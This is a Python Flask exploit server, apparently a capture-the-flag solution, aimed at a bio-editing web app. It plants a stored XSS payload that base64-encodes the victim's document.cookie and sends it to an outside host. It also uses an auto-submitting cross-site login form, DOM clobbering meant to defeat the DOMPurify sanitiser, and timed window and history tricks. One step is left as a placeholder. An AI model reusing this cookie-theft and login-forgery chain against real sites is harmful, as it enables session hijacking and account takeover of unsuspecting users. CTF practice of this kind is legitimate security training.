from flask import Flask, request, render_template_string, redirect, make_response
import requests

app = Flask(__name__)

HOST = "http://hax.perfect.blue:6969"

@app.route('/start')
def start():
    set_bio("hacc", """ <iframe srcdoc="<script>location='http://hax.perfect.blue/?leek='+btoa(document.cookie);</script>"></iframe> """ )

    html_content = f"""
    <html>
    <body>
        <h1>CTF Challenge</h1>
        <script>
        function sleep(ms) {{
            return new Promise(resolve => setTimeout(resolve, ms));
        }}
        window.onload = async function(){{
            open("/login_user");
            await sleep(1000);            

            await (await fetch("/part1")).text();
            let w1 = open("{HOST}/user/home")
            await sleep(2000);            

            await (await fetch("/part2")).text();
            let w2 = open("{HOST}/user/home")
            await sleep(2000);            
            
            w1.location = "/history";
        }}
        </script>
    </body>
    </html>
    """
    return html_content

@app.route("/login_user")
def login():
    return f"""
<body>
    <h1>Update Your Bio</h1>
    <form action="{HOST}/login" id=pepega method="POST">
        <textarea id="username" name="username" rows="4" cols="50">hacc</textarea><br>
        <input type="submit" value="Submit">
    </form>

    <script>
        document.getElementById("pepega").submit();
    </script>
</body>
    """

@app.route('/part1')
def part1():
    set_bio("targethacc", SRCPAGE)
    set_bio("home", HOMEPAGE)

    return "Part 1 completed"

@app.route('/part2')
def part2():
    delete_user("home")
    # Implement part 2 of the exploit
    # This is a placeholder for the actual implementation
    return "Part 2 completed"

@app.route('/history')
def history():
    return """
    <script>
    history.back();
    </script>
    """
HOMEPAGE = """
<h1>exploit</h1>
        <iframe id=dompurifyFrame src=/user/targethacc></iframe>
"""
SRCPAGE = """
<iframe name=nodeType></iframe>
<script type=module src=/static/purify.js></script>
"""

def set_bio(user, bio):
    requests.post(HOST+"/login", data={"username":user})
    requests.post(HOST+"/user/update", cookies={"username":user}, data={"bio":bio})

def delete_user(user):
    requests.get(HOST+"/logout", cookies={"username":user})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=7000, threaded=True)